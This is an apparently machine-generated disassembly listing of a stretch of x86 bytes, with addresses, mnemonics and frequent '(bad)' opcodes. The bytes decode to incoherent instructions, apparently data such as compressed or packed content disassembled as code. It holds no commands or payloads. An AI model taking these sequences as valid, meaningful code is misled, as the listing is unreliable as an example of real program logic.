  427365:	mov    esi,0x38913b
  42736a:	call   0x3f9791f3
  42736f:	pop    ebp
  427370:	xchg   ebx,eax
  427371:	jl     0x42737e
  427373:	cmc    
  427374:	dec    edx
  427375:	inc    ebx
  427376:	scas   al,BYTE PTR es:[edi]
  427377:	(bad)  
  427378:	clc    
  427379:	sub    DWORD PTR [esi+0x49],ecx
  42737c:	cwde   
  42737d:	jmp    0x4273ae
  42737f:	xchg   ebp,eax
  427380:	dec    ebp
  427381:	imul   edx,DWORD PTR [esi+0x2dfff329],0x6ac5df26
  42738b:	push   cs
  42738c:	mov    ebp,0xcf45d83c
  427391:	jmp    0x427373
  427393:	dec    di
  427395:	push   0x5b3a154c
  42739a:	cmp    bh,dl
  42739c:	neg    ecx
  42739e:	sub    al,0x94
  4273a0:	loopne 0x427328
  4273a2:	mov    ebp,0x69a8ca9d
  4273a7:	dec    esp
  4273a8:	or     eax,DWORD PTR [eax-0x66e4a663]
  4273ae:	add    eax,0xc1a54402
  4273b3:	cld    
  4273b4:	and    DWORD PTR [eax],ebx
  4273b6:	mov    al,BYTE PTR [edx-0x181cdde8]
  4273bc:	sbb    eax,0xc7498bb3
  4273c1:	aaa    
  4273c2:	pop    edx
  4273c3:	or     al,0xee
  4273c5:	and    al,0x53
  4273c7:	jecxz  0x427359
  4273c9:	or     BYTE PTR [eax],dh
  4273cb:	int3   
  4273cc:	inc    esp
  4273cd:	pop    edx
  4273ce:	fnstsw WORD PTR [ecx+edx*2+0x676f90ef]
  4273d5:	xchg   ebp,eax
  4273d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273d7:	es push esp
  4273d9:	(bad)  
  4273da:	fisub  DWORD PTR [eax+0x7ac421b8]
  4273e0:	iret   
  4273e1:	rol    BYTE PTR [ebx],cl
  4273e3:	mov    edx,esi
  4273e5:	mov    ah,0xba
  4273e7:	sbb    al,0xe2
  4273e9:	sub    DWORD PTR [eax*4+0x5c5f55e6],0xffffff8f
  4273f1:	sub    BYTE PTR [edi],0x41
  4273f4:	ffreep st(3)
  4273f6:	mov    ah,BYTE PTR [esi]
  4273f8:	mov    ecx,0x92072bb6
  4273fd:	adc    DWORD PTR [ebp*1+0x695640c2],eax
  427404:	and    al,0xc4
  427406:	hlt    
  427407:	in     al,0xe9
  427409:	imul   edi,DWORD PTR [ecx-0x49],0x41
  42740d:	mov    ds:0xdbe6d400,eax
  427412:	cld    
  427413:	jmp    FWORD PTR [eax+0x12]
  427416:	ins    DWORD PTR es:[edi],dx
  427417:	jns    0x427409
  427419:	inc    ecx
  42741a:	mov    edx,0xd03d82a7
  42741f:	(bad)  
  427420:	repnz fwait
  427422:	dec    edi
  427423:	dec    DWORD PTR [edi]
  427425:	and    ch,ch
  427427:	jl     0x4273b1
  427429:	mov    ds:0x57b19166,al
  42742e:	add    al,dl
  427430:	xchg   ebp,eax
  427431:	das    
  427432:	mov    ah,0x87
  427434:	icebp  
  427435:	mov    dh,0x43
  427437:	inc    edx
  427438:	ins    DWORD PTR es:[edi],dx
  427439:	or     ch,bl
  42743b:	add    dh,BYTE PTR [ecx+eiz*4-0x71c5bc4]
  427442:	adc    eax,0x3910d2bf
  427447:	ror    BYTE PTR [ebx-0x58],1
  42744a:	add    DWORD PTR ds:0x7671f2f5,0x1f
  427451:	or     BYTE PTR [ebx+0x47],bl
  427454:	(bad)  
  427455:	and    eax,0x32a303f5
  42745a:	daa    
  42745b:	cmp    bl,bl
  42745d:	push   edi
  42745e:	inc    DWORD PTR [ecx]
  427460:	jle    0x427475
  427462:	daa    
  427463:	ja     0x42746d
  427465:	scas   al,BYTE PTR es:[edi]
  427466:	dec    esi
  427467:	outs   dx,BYTE PTR ds:[esi]
  427468:	retf   
  427469:	bound  ebx,QWORD PTR [eax]
  42746b:	mov    ebp,0xe4
	...
  427478:	add    BYTE PTR [eax],al
  42747a:	push   0x6f1e2d23
  42747f:	push   ds
  427480:	jnp    0x4274f9
  427482:	outs   dx,DWORD PTR ds:[esi]
  427483:	jno    0x4274a3
  427485:	dec    esi
  427486:	ja     0x427418
  427488:	push   0x1ea041b
  42748d:	add    bl,bh
  42748f:	add    DWORD PTR [eax],eax
  427491:	add    BYTE PTR [edi-0x51],ch
  427494:	mov    ds:0x3c7a9c8a,eax
  427499:	inc    eax
  42749a:	mov    ds:0x885c4498,eax
  42749f:	cdq    
  4274a0:	jecxz  0x42751d
  4274a2:	mov    al,ds:0x5a47c469
  4274a7:	sahf   
  4274a8:	xor    eax,0xfc72c8fb
  4274ad:	dec    esp
  4274ae:	mov    ds:0xb00b0e03,al
  4274b3:	fld    DWORD PTR [ebx+0x7849b5dc]
  4274b9:	stos   BYTE PTR es:[edi],al
  4274ba:	addr16 sub eax,0xac81e451
  4274c0:	and    ah,BYTE PTR [esi]
  4274c2:	shr    DWORD PTR [eax+edi*2],1
  4274c5:	std    
  4274c6:	sbb    dh,al
  4274c8:	mov    edx,0x89d8fe10
  4274cd:	and    al,0x54
  4274cf:	cmc    
  4274d0:	push   edi
  4274d1:	mov    al,ds:0xa30de988
  4274d6:	popa   
  4274d7:	jle    0x427524
  4274d9:	fisubr DWORD PTR [edi+eax*4+0x6aa1b13c]
  4274e0:	inc    edx
  4274e1:	xor    bh,dl
  4274e3:	push   ebx
  4274e4:	call   0x7ffc:0x78aabc1b
  4274eb:	sahf   
  4274ec:	aad    0x29
  4274ee:	and    BYTE PTR [edi+eiz*1+0xc9e7160],cl
  4274f5:	xor    esp,eax
  4274f7:	xchg   WORD PTR [esi-0x5],ax
  4274fb:	push   0xaa3422d2
  427500:	mov    dh,0x58
  427502:	pop    esp
  427503:	jmp    0x6f92:0xbcacc30f
  42750a:	mov    dh,0x10
  42750c:	stos   BYTE PTR es:[edi],al
  42750d:	in     al,dx
  42750e:	sbb    ah,BYTE PTR [edi]
  427510:	mov    ebx,0x95a481a5
  427515:	fcom   QWORD PTR [esi+0x4424f0d9]
  42751b:	push   esi
  42751c:	shl    BYTE PTR [ecx+esi*8],1
  42751f:	xlat   BYTE PTR ds:[ebx]
  427520:	repz repz xchg ebx,eax
  427523:	pop    edx
  427524:	lods   eax,DWORD PTR ds:[esi]
  427525:	xor    BYTE PTR [ecx+0x4b40a16],ah
  42752b:	rcr    ah,0x92
  42752e:	mov    edx,eax
  427530:	xchg   ebx,eax
  427531:	test   al,0xa0
  427533:	mov    edi,0xcddd2eaf
  427538:	mov    esp,edx
  42753a:	or     esp,DWORD PTR [eax+eax*8]
  42753d:	pop    edi
  42753e:	mov    ds:0xbf1f5f1,al
  427543:	pushf  
  427544:	mov    al,BYTE PTR [ebp+0x5ad078c1]
  42754a:	out    dx,eax
  42754b:	js     0x4274e6
  42754d:	push   eax
  42754e:	(bad)  
  42754f:	push   esp
  427550:	leave  
  427551:	repnz adc eax,0xe91cf4a4
  427557:	sahf   
  427558:	push   esi
  427559:	jmp    0xc2705515
  42755e:	mov    ebx,0xee3fa32e
  427563:	fcom   st(1)
  427565:	sbb    dh,bh
  427567:	push   ebx
  427568:	iret   
  427569:	inc    esi
  42756a:	cdq    
  42756b:	and    DWORD PTR ds:0xac1e5e11,eax
  427571:	mov    bh,0x20
  427573:	and    al,0x5e
  427575:	add    BYTE PTR [eax-0x11d77ab8],dh
  42757b:	ins    DWORD PTR es:[edi],dx
  42757c:	(bad)  
  42757d:	adc    BYTE PTR [eax-0xccf1077],bl
  427583:	loope  0x427522
  427585:	shr    DWORD PTR [edx+0x4d],1
  427588:	fld    TBYTE PTR [edi+0x36]
  42758b:	mov    BYTE PTR ds:0x479a3e19,0xc9
  427592:	inc    esp
  427593:	imul   ebp,DWORD PTR [ecx+0x6f],0xecdaa87c
  42759a:	ins    BYTE PTR es:[edi],dx
  42759b:	mov    ecx,0xb6bed1d
  4275a0:	fimul  WORD PTR cs:[ebp+0xb8adef5]
  4275a7:	mov    esp,0x3f1ad9e5
  4275ac:	out    0x59,al
  4275ae:	pop    ebx
  4275af:	cmp    esp,esp
  4275b1:	xchg   edx,eax
  4275b2:	mov    ds:0x87482532,al
  4275b7:	shl    DWORD PTR [ecx],0x69
  4275ba:	adc    BYTE PTR [edi-0x4a],ch
  4275bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275be:	scas   al,BYTE PTR es:[edi]
  4275bf:	hlt    
  4275c0:	xor    eax,0x60891e28
  4275c5:	jmp    0x3f6c:0x5d81a300
  4275cc:	pushf  
  4275cd:	mov    ds:0x8bcf1a5,al
  4275d2:	sub    al,BYTE PTR [ecx-0x2b691802]
  4275d8:	fs or  si,si
  4275dc:	xchg   ebp,eax
  4275dd:	call   DWORD PTR [eax-0x6b]
  4275e0:	call   0x282a:0x2e4e
  4275e6:	mov    ecx,0x9d3aafe6
  4275eb:	and    cl,bh
  4275ed:	pop    es
  4275ee:	adc    dh,bh
  4275f0:	cmp    BYTE PTR [ebx],0xa4
  4275f3:	cmp    BYTE PTR ds:0xe3034b3f,0x70
  4275fa:	mov    DWORD PTR [eax],edx
  4275fc:	lods   al,BYTE PTR ds:[esi]
  4275fd:	lods   eax,DWORD PTR ds:[esi]
  4275fe:	int    0x86
  427600:	arpl   WORD PTR [ebx],si
  427602:	out    dx,eax
  427603:	sti    
  427604:	adc    ebx,DWORD PTR [edi-0xe867f4d]
  42760a:	aam    0xf7
  42760c:	sbb    bl,BYTE PTR [ecx-0x76]
  42760f:	cmp    dl,BYTE PTR [ebx+ebp*4-0x5c]
  427613:	xchg   BYTE PTR [ebp-0x45],bl
  427616:	cmp    eax,0xc9e5889b
  42761b:	mov    ecx,0xcd8d5282
  427620:	ja     0x4275ba
  427622:	inc    esi
  427623:	sub    DWORD PTR [ebx-0x1f],edx
  427626:	jns    0x427601
  427628:	sub    eax,0xc64d590a
  42762d:	int3   
  42762e:	sub    BYTE PTR [ebx+0x13],dh
  427631:	dec    esi
  427632:	outs   dx,DWORD PTR ds:[esi]
  427633:	or     ebx,DWORD PTR [edi+0x5eecc948]
  427639:	inc    eax
  42763a:	pop    eax
  42763b:	pop    es
  42763c:	gs aas 
  42763e:	(bad)  
  42763f:	push   edi
  427640:	fdiv   QWORD PTR [eax-0x4e]
  427643:	cs in  al,0xc7
  427646:	or     DWORD PTR [eax],ecx
  427648:	fnstenv [eax+edx*2]
  42764b:	dec    ebx
  42764c:	sub    eax,0x7def2c67
  427651:	jb     0x4275ef
  427653:	stos   DWORD PTR es:[edi],eax
  427654:	jae    0x42765a
  427656:	xchg   dh,bh
  427658:	cmp    BYTE PTR [ebp+0x1e018244],bh
  42765e:	fs jae 0x427615
  427661:	inc    edi
  427662:	jge    0x427682
  427664:	int3   
  427665:	xchg   ebp,eax
  427666:	add    DWORD PTR [edx+eiz*8+0x40],edx
  42766a:	mov    bh,0x31
  42766c:	push   edi
  42766d:	mov    esp,0xf75a40dc
  427672:	(bad)  
  427673:	(bad)  
  427674:	cmp    eax,0x10c3c3f
  427679:	jb     0x4276e4
  42767b:	lods   al,BYTE PTR ds:[esi]
  42767c:	push   ebx
  42767d:	out    dx,al
  42767e:	mov    dl,0x5d
  427681:	lahf   
  427682:	je     0x4276cb
  427684:	jb     0x42764e
  427686:	out    0x81,al
  427688:	pusha  
  427689:	xchg   edi,eax
  42768a:	sti    
  42768b:	mov    ds:0x4c,eax
	...
  427698:	add    BYTE PTR [eax],al
  42769a:	cdq    
  42769b:	enter  0x9ff8,0xf9
  42769f:	mov    edi,0xcf7dceff
  4276a4:	stc    
  4276a5:	popf   
  4276a6:	pop    esp
  4276a7:	and    BYTE PTR [ebx],bl
  4276a9:	mov    edi,?
  4276ab:	jmp    0x4276ae
  4276ad:	add    bl,bh
  4276af:	add    DWORD PTR [eax],eax
  4276b1:	add    BYTE PTR [ecx-0x666d197d],ch
  4276b7:	pop    ebx
  4276b8:	scas   al,BYTE PTR es:[edi]
  4276b9:	jne    0x4276fe
  4276bb:	out    dx,eax
  4276bc:	add    DWORD PTR [ebx],edi
  4276be:	outs   dx,DWORD PTR ds:[esi]
  4276bf:	mov    bl,BYTE PTR cs:[ecx+0x4719fd]
  4276c6:	pop    edi
  4276c7:	es push ecx
  4276c9:	aaa    
  4276ca:	and    al,0x2c
  4276cc:	es mov bl,bh
  4276cf:	cld    
  4276d0:	push   cs
  4276d1:	stos   BYTE PTR es:[edi],al
  4276d2:	mov    ds,WORD PTR [eax*4+0x1286039f]
  4276d9:	ja     0x427685
  4276db:	je     0x4276ca
  4276dd:	es inc ecx
  4276df:	das    
  4276e0:	rcr    DWORD PTR fs:0x67331cf0,1
  4276e7:	and    bh,al
  4276e9:	sub    DWORD PTR [eax+0x596932cd],edx
  4276ef:	jmp    0x87f2:0x6d48bdc5
  4276f6:	in     eax,dx
  4276f7:	popf   
  4276f8:	dec    esi
  4276f9:	push   es
  4276fa:	cs in  eax,dx
  4276fc:	out    0xb3,eax
  4276fe:	scas   al,BYTE PTR es:[edi]
  4276ff:	dec    edi
  427700:	jb     0x427768
  427702:	sub    BYTE PTR [ebx+eax*4-0x4b],bl
  427706:	pop    eax
  427707:	or     bh,bh
  427709:	pop    es
  42770a:	and    eax,DWORD PTR [eax]
  42770c:	sub    al,0x7b
  42770e:	push   esp
  42770f:	adc    al,0xb3
  427711:	cmp    DWORD PTR [edi],esp
  427713:	in     eax,dx
  427714:	ja     0x4276fb
  427716:	jbe    0x42777d
  427718:	xor    edi,DWORD PTR [esi+ebp*1]
  42771b:	mov    ds:0xd41e5689,al
  427720:	push   ebx
  427721:	gs xor al,0x17
  427724:	adc    dl,dl
  427726:	(bad)  
  427727:	(bad)  
  427728:	repz push eax
  42772a:	push   edi
  42772b:	fbstp  TBYTE PTR [ebx-0x22]
  42772e:	sbb    BYTE PTR [esi],0x92
  427731:	jbe    0x427731
  427733:	(bad)  
  427734:	adc    DWORD PTR [eax-0x46],edx
  427737:	push   ecx
  427738:	sub    BYTE PTR [ecx-0x6fb5afe9],al
  42773e:	or     BYTE PTR [ebx-0x6b],dh
  427741:	dec    edx
  427742:	ror    bh,cl
  427744:	mov    eax,0x96fbffd2
  427749:	inc    ebx
  42774a:	cmp    eax,0xf2417425
  42774f:	mov    ch,0xc3
  427751:	cwde   
  427752:	out    0x9f,al
  427754:	out    dx,eax
  427755:	jmp    0xb61c:0x225c51cd
  42775c:	ret    
  42775d:	repz and eax,0xf174fbe5
  427763:	xor    al,0x87
  427765:	xchg   esp,eax
  427766:	shl    BYTE PTR [ecx+edi*1-0x57],cl
  42776a:	adc    eax,0x6f29adbf
  42776f:	in     eax,dx
  427770:	imul   edx,DWORD PTR [edx+0x49],0xffffff9f
  427774:	arpl   di,dx
  427776:	data16 outs dx,BYTE PTR ds:[esi]
  427778:	jp     0x4277d8
  42777a:	inc    esi
  42777b:	mov    ah,0xdb
  42777d:	cmc    
  42777e:	ja     0x4277f1
  427780:	pop    ebp
  427781:	jmp    FWORD PTR [ecx+edx*4+0xdeca3b4]
  427788:	pusha  
  427789:	in     al,0xca
  42778b:	push   0x5
  42778d:	es stos DWORD PTR es:[edi],eax
  42778f:	or     al,0x68
  427791:	inc    esp
  427792:	dec    ebp
  427793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427794:	inc    eax
  427795:	fcom   st(2)
  427797:	fsub   QWORD PTR [eax]
  427799:	mov    dh,0x68
  42779b:	xchg   DWORD PTR [eax+0x3efc450d],ebp
  4277a1:	pushf  
  4277a2:	add    edx,DWORD PTR [ebx+0x1586be0e]
  4277a8:	inc    edx
  4277a9:	dec    esi
  4277aa:	test   al,0x66
  4277ac:	retf   0x5ec9
  4277af:	nop
  4277b0:	rcr    DWORD PTR [eax+0x2a],cl
  4277b3:	stc    
  4277b4:	and    eax,0xb146dcb0
  4277b9:	mov    BYTE PTR [edx-0x1c],ch
  4277bc:	pop    ebp
  4277bd:	dec    esi
  4277be:	in     eax,0xae
  4277c0:	lods   eax,DWORD PTR ds:[esi]
  4277c1:	sbb    dl,BYTE PTR ds:0x3af08b05
  4277c7:	xchg   edx,eax
  4277c8:	repnz cmp BYTE PTR [eax-0x56],cl
  4277cc:	out    0xe0,eax
  4277ce:	in     eax,0x2f
  4277d0:	cmc    
  4277d1:	(bad)  
  4277d2:	mov    ch,0x1
  4277d4:	fst    QWORD PTR [esi-0x239b7148]
  4277da:	sbb    eax,0xe8d4c8ad
  4277df:	push   ebp
  4277e0:	gs cmp eax,0x4576f69d
  4277e6:	inc    ecx
  4277e7:	cmp    DWORD PTR [ecx-0x2b],ebx
  4277ea:	call   0xd1cba7d8
  4277ef:	dec    edx
  4277f0:	jp     0x427824
  4277f2:	pop    ecx
  4277f3:	cld    
  4277f4:	push   cs
  4277f5:	jg     0x427829
  4277f7:	or     eax,0x1e27d11b
  4277fc:	inc    edi
  4277fd:	xchg   ecx,eax
  4277fe:	jle    0x427856
  427800:	mov    ecx,0xd83e0b04
  427805:	int3   
  427806:	sar    DWORD PTR [esi+eax*4-0xa224f89],1
  42780d:	jecxz  0x42785f
  42780f:	xchg   esp,eax
  427810:	test   BYTE PTR [esi],ch
  427812:	gs aad 0x80
  427815:	lock mov ?,WORD PTR [ebx-0x76475766]
  42781c:	xchg   BYTE PTR [edx+0x7b],ah
  42781f:	hlt    
  427820:	outs   dx,DWORD PTR ds:[esi]
  427821:	rcl    BYTE PTR [ecx+0x48],0x21
  427825:	loop   0x427891
  427827:	push   ds
  427828:	sbb    BYTE PTR [ecx-0x6fab7fc8],dh
  42782e:	add    al,0xc3
  427830:	cdq    
  427831:	jp     0x427825
  427833:	ins    DWORD PTR es:[edi],dx
  427834:	ss call 0xc6817be9
  42783a:	add    ch,BYTE PTR [ecx+0x782be706]
  427840:	sbb    eax,0xcfb8d285
  427845:	cmc    
  427846:	ucomiss xmm0,DWORD PTR [ebx]
  427849:	(bad)  
  42784a:	js     0x4277ec
  42784c:	push   ebp
  42784d:	or     BYTE PTR [ebp-0x75],al
  427850:	rol    DWORD PTR [ebp-0x6904a34],0x40
  427857:	jle    0x427827
  427859:	add    al,0x31
  42785b:	jnp    0x4278b9
  42785d:	xchg   ebp,eax
  42785e:	(bad)  
  427860:	mov    es,WORD PTR [edx]
  427862:	int3   
  427863:	push   eax
  427864:	adc    al,0x34
  427866:	fnstenv [edx-0x148a5101]
  42786c:	data16 fidivr DWORD PTR [edx-0x69]
  427870:	mov    BYTE PTR cs:[edi+eax*4+0xcf96dd6],ch
  427878:	add    DWORD PTR [edx-0x13bcee5d],eax
  42787e:	cmc    
  42787f:	fsubr  st,st(2)
  427881:	bound  eax,QWORD PTR [edi-0x75]
  427884:	(bad)  
  427885:	cld    
  427886:	jbe    0x427890
  427888:	inc    ebp
  427889:	pop    ss
  42788a:	shl    esi,0x84
  42788d:	push   ebx
  42788e:	ins    DWORD PTR es:[edi],dx
  42788f:	cmc    
  427890:	sub    ebx,DWORD PTR [ecx-0x13]
  427893:	inc    eax
  427894:	lahf   
  427895:	pop    ebp
  427896:	out    0x46,al
  427898:	jg     0x427868
  42789a:	xchg   ecx,eax
  42789b:	push   eax
  42789c:	pusha  
  42789d:	adc    DWORD PTR [eax-0x60d75a0a],ebp
  4278a3:	xor    al,0xf6
  4278a5:	mov    ds:0x8622a38d,al
  4278aa:	lahf   
  4278ab:	int    0x3
	...
  4278b9:	add    BYTE PTR [ecx+0xa],bh
  4278bc:	sbb    BYTE PTR gs:[edi+0x7f],dh
  4278c0:	jge    0x42792d
  4278c2:	and    DWORD PTR [ebp+0x30],ecx
  4278c5:	dec    esi
  4278c6:	pop    ds
  4278c7:	into   
  4278c8:	outs   dx,DWORD PTR ds:[esi]
  4278c9:	aaa    
  4278ca:	cli    
  4278cb:	in     eax,dx
  4278cc:	add    DWORD PTR [eax],eax
  4278ce:	sti    
  4278cf:	add    DWORD PTR [eax],eax
  4278d1:	add    dl,ah
  4278d3:	jmp    0x4278a1
  4278d5:	out    0xa9,al
  4278d7:	scas   al,BYTE PTR es:[edi]
  4278d8:	xlat   BYTE PTR ds:[ebx]
  4278d9:	pop    esi
  4278da:	dec    edx
  4278db:	sub    dl,BYTE PTR [eax+0x23]
  4278de:	mov    esp,0xe98aec8a
  4278e3:	int3   
  4278e4:	iret   
  4278e5:	and    al,0xdc
  4278e7:	mov    ds:0xa9ebaa09,al
  4278ec:	pop    ds
  4278ed:	pushf  
  4278ee:	dec    ebx
  4278ef:	jno    0x4278b9
  4278f1:	dec    esi
  4278f2:	inc    ebx
  4278f3:	mov    bh,0x44
  4278f5:	push   cs
  4278f6:	xchg   esi,eax
  4278f7:	cmp    BYTE PTR [edx],bl
  4278f9:	xor    DWORD PTR [esi],eax
  4278fb:	xchg   ebx,eax
  4278fc:	mov    eax,ds:0x35ce7bab
  427901:	retf   
  427902:	sbb    ebx,ebx
  427904:	ror    BYTE PTR [eax],0x74
  427907:	and    eax,ebx
  427909:	jmp    DWORD PTR [eax-0x2f]
  42790c:	sub    eax,0x37474ccb
  427911:	call   0x9a33:0xb35646a7
  427918:	daa    
  427919:	lods   eax,DWORD PTR ds:[esi]
  42791a:	scas   eax,DWORD PTR es:[edi]
  42791b:	icebp  
  42791c:	dec    ebp
  42791d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42791e:	rcl    DWORD PTR [ebx],cl
  427920:	jmp    0x4278a2
  427922:	dec    edi
  427923:	adc    eax,0xef0d6d6a
  427928:	test   BYTE PTR [esi+0x17],0x92
  42792c:	push   cs
  42792d:	fwait
  42792e:	mov    al,ah
  427930:	imul   esi,DWORD PTR [esi-0xb],0x71012ce
  427937:	push   ebx
  427938:	mov    esp,0xca96dad6
  42793d:	mov    ds:0x551f8fe2,eax
  427942:	adc    eax,0xcfcce4a9
  427947:	jecxz  0x42795b
  427949:	(bad)  
  42794a:	adc    ch,BYTE PTR [ecx+0x7]
  42794d:	push   es
  42794e:	punpcklwd mm0,mm7
  427951:	adc    BYTE PTR [ebx],bh
  427953:	inc    edx
  427954:	test   eax,0x5eb33bfd
  427959:	mov    eax,ds:0xf98d325d
  42795e:	shr    ecx,1
  427960:	popa   
  427961:	jle    0x4279ca
  427963:	push   0x9
  427965:	not    DWORD PTR [ebx-0x5f323973]
  42796b:	jb     0x4279ba
  42796d:	and    dl,al
  42796f:	add    bl,bl
  427971:	mov    ebp,0x53deb2d6
  427976:	in     al,0xb8
  427978:	jae    0x4279f7
  42797a:	sbb    eax,0x52e14fa3
  42797f:	mov    esi,0xde5d4e9c
  427984:	jnp    0x4279ba
  427986:	ds or  eax,0x79cc54e
  42798c:	lds    eax,FWORD PTR [edi+0x31]
  42798f:	and    BYTE PTR [eax-0x73],0x1c
  427993:	fwait
  427994:	in     eax,0xa9
  427996:	sahf   
  427997:	push   esi
  427998:	and    al,ch
  42799a:	in     eax,0x17
  42799c:	ror    BYTE PTR [ecx+0x4c],1
  42799f:	hlt    
  4279a0:	out    dx,al
  4279a1:	and    esp,DWORD PTR [eax+ebp*2-0x22]
  4279a5:	out    0xf7,al
  4279a7:	fmul   QWORD PTR [edx-0x2f]
  4279aa:	sub    al,0x5c
  4279ac:	(bad)  
  4279ae:	xchg   esp,eax
  4279af:	adc    DWORD PTR [ecx],0xb45c33b8
  4279b5:	push   ebp
  4279b6:	inc    si
  4279b8:	setp   BYTE PTR [edi]
  4279bb:	inc    ebp
  4279bc:	mov    ch,0x64
  4279be:	hlt    
  4279bf:	mov    BYTE PTR [ecx*1-0x4720f344],0x95
  4279c7:	inc    edi
  4279c8:	mov    WORD PTR [esi+0x60],fs
  4279cb:	rcr    DWORD PTR [ebx],1
  4279cd:	sbb    BYTE PTR [esi],ch
  4279cf:	adc    eax,0x3c102c2d
  4279d4:	dec    edi
  4279d5:	mov    bl,0x63
  4279d7:	xchg   edx,eax
  4279d8:	stos   DWORD PTR es:[edi],eax
  4279d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279da:	add    ah,BYTE PTR [ebp+0x63c84be1]
  4279e0:	lods   eax,DWORD PTR ds:[esi]
  4279e1:	inc    ebx
  4279e2:	pop    ds
  4279e3:	mov    ebp,DWORD PTR [eax]
  4279e5:	test   ch,dl
  4279e7:	add    BYTE PTR [edi],dh
  4279e9:	adc    bl,BYTE PTR [edx]
  4279eb:	xor    eax,0xde6c59e6
  4279f0:	xor    BYTE PTR [ebx+0x3c],dh
  4279f3:	fcmove st,st(6)
  4279f5:	out    0x2a,al
  4279f7:	mov    esp,0xbe97dfbc
  4279fc:	mov    al,ds:0x423f1b53
  427a01:	in     eax,dx
  427a02:	jne    0x4279d1
  427a04:	popf   
  427a05:	and    dh,BYTE PTR cs:[eax]
  427a08:	or     dl,BYTE PTR ds:0xda800c7f
  427a0e:	fwait
  427a0f:	out    dx,al
  427a10:	imul   eax,DWORD PTR [eax],0xdb0c316f
  427a16:	mov    cs,WORD PTR [ebp+0x18]
  427a19:	pop    eax
  427a1a:	add    esp,DWORD PTR [edx-0x1966f87c]
  427a20:	push   0x8e0bdc
  427a25:	and    cl,BYTE PTR [ebp+0xc6591a]
  427a2b:	das    
  427a2c:	xor    DWORD PTR [eax-0x63],edx
  427a2f:	cmp    BYTE PTR [ecx],dl
  427a31:	js     0x427a44
  427a33:	cli    
  427a34:	mul    BYTE PTR [eax+0x49]
  427a37:	scas   eax,DWORD PTR es:[edi]
  427a38:	jmp    0xed60:0xc6cdd5a
  427a3f:	cmc    
  427a40:	pop    eax
  427a41:	shl    DWORD PTR [esi],cl
  427a43:	fadd   DWORD PTR [ebp-0xb1730c]
  427a49:	cs std 
  427a4b:	retf   0xaf89
  427a4e:	jne    0x4279d3
  427a50:	stos   DWORD PTR es:[edi],eax
  427a51:	and    dh,BYTE PTR [ecx-0x7a]
  427a54:	pop    esi
  427a55:	bound  eax,QWORD PTR [edx-0x57362ba9]
  427a5b:	dec    ebp
  427a5c:	push   ebx
  427a5d:	cmc    
  427a5e:	fisttp WORD PTR [edi+edi*4]
  427a61:	add    al,0x98
  427a63:	outs   dx,BYTE PTR ds:[esi]
  427a64:	push   ebp
  427a65:	xchg   ebx,eax
  427a66:	cli    
  427a67:	inc    ecx
  427a68:	inc    ebx
  427a69:	hlt    
  427a6a:	call   0x35011450
  427a6f:	(bad)  
  427a70:	jmp    0xb1f0a71f
  427a75:	addr16 mov esi,0xac3ae81f
  427a7b:	(bad)  
  427a7c:	xor    dh,bl
  427a7e:	idiv   DWORD PTR [eax-0x39fa8222]
  427a84:	(bad)  
  427a85:	cmp    eax,0x9403668c
  427a8a:	test   BYTE PTR [edi+ecx*1-0xd235fe8],ch
  427a91:	int3   
  427a92:	pop    ds
  427a93:	loopne 0x427a51
  427a95:	ret    
  427a96:	mov    ds:0x63d5b1d7,eax
  427a9b:	pop    ds
  427a9c:	pop    esp
  427a9d:	(bad)  
  427a9e:	(bad)  [ebp-0x87282dc]
  427aa4:	imul   edx,DWORD PTR [edi+0x28],0xde47a8c1
  427aab:	jg     0x427a87
  427aad:	mov    dl,0x2c
  427aaf:	rep ins BYTE PTR es:[di],dx
  427ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ab3:	jge    0x427aa9
  427ab5:	fisub  DWORD PTR [eax+0x1c3e5ddf]
  427abb:	sub    bh,BYTE PTR [esi-0x45dba4e]
  427ac1:	and    BYTE PTR [edi+esi*8],ah
  427ac4:	popf   
  427ac5:	and    esi,DWORD PTR ds:0x2178738e
  427acb:	xor    al,0x2e
	...
  427ad9:	add    BYTE PTR [ecx+0x3],bl
  427adc:	rol    DWORD PTR [ebx+ebx*8-0x3a],0xdd
  427ae1:	pop    ds
  427ae2:	arpl   WORD PTR [edi-0x4245b294],di
  427ae8:	jl     0x427b32
  427aea:	cmc    
  427aeb:	out    dx,eax
  427aec:	add    DWORD PTR [eax],eax
  427aee:	sti    
  427aef:	add    DWORD PTR [eax],eax
  427af1:	add    cl,dl
  427af3:	xor    DWORD PTR [edi-0x68da255b],esp
  427af9:	adc    al,0xc0
  427afb:	(bad)  
  427afd:	mov    dh,0x3a
  427aff:	adc    bl,BYTE PTR [ebp+0x682043b1]
  427b05:	call   0xc271:0x7e8f2012
  427b0c:	push   ebp
  427b0d:	push   edi
  427b0e:	icebp  
  427b0f:	dec    edi
  427b10:	pop    edi
  427b11:	fnsave [ebx-0x4c]
  427b14:	icebp  
  427b15:	add    DWORD PTR fs:[ebx],ecx
  427b18:	fbld   TBYTE PTR [esi+eax*1]
  427b1b:	mov    ?,WORD PTR [edx+0x59c15986]
  427b21:	sub    ah,BYTE PTR [esi+0x3f795a99]
  427b27:	dec    ebp
  427b28:	aaa    
  427b29:	call   0xad13:0x52b798b3
  427b30:	into   
  427b31:	sub    DWORD PTR [esi-0x5547f3c8],edx
  427b37:	mov    ebp,0xd59ac4eb
  427b3c:	mov    dh,0x8f
  427b3e:	mov    ?,WORD PTR [edx]
  427b40:	adc    edx,edx
  427b42:	sub    eax,0x4149d339
  427b47:	add    BYTE PTR [esi],cl
  427b49:	outs   dx,DWORD PTR ds:[esi]
  427b4a:	aad    0x37
  427b4c:	leave  
  427b4d:	stos   BYTE PTR es:[edi],al
  427b4e:	inc    esi
  427b4f:	jb     0x427bad
  427b51:	pusha  
  427b52:	sbb    edx,DWORD PTR [eax-0x3c]
  427b55:	xchg   DWORD PTR gs:[edx-0x3767f8ec],ebp
  427b5c:	push   esi
  427b5d:	dec    esi
  427b5e:	stos   BYTE PTR es:[edi],al
  427b5f:	dec    eax
  427b60:	push   0x4f
  427b62:	jne    0x427be2
  427b64:	bound  ecx,QWORD PTR [edi]
  427b66:	les    ebx,FWORD PTR [ecx-0x16]
  427b69:	aas    
  427b6a:	hlt    
  427b6b:	pop    ebx
  427b6c:	push   es
  427b6d:	aad    0x3e
  427b6f:	gs lahf 
  427b71:	es in  al,dx
  427b73:	test   al,0x6f
